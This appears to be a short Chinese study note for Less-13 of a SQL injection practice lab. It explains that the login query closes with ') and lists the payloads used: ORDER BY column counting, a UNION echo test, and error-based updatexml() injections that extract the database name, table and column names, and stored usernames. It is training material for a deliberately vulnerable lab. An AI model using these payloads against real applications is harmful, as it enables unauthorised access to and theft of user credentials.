---
title: less13
url: https://www.yuque.com/u29002979/ep2zrx/fgtmtrfgkke6rm22
---

```bash
@$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
```

与Less12的唯一区别为闭合方式为**')** &#x20;
`1')` <a name="nEKcR"></a>

# 报错注入

用**updatexml()函数**进行报错注入 &#x20;
updatexml（1，2，3）

```bash
查询字段数
1') order by 3-- + 
登录后页面报错Unknown column '3' in 'order clause'
1') order by 2-- +
没有提示错误，说明有2个字段；

判断回显点
1') union select 1,2 -- +
没有显示1，2

查询数据库表
-1') or updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +
爆破数据表
-1') or updatexml(1,concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e),1) -- +
爆破字段名
-1') or updatexml(1,concat(0x7e,(select (column_name)from information_schema.columns where table_name='users' limit 8,1),0x7e),1) -- +
爆破字段
-1') or updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) -- +

```
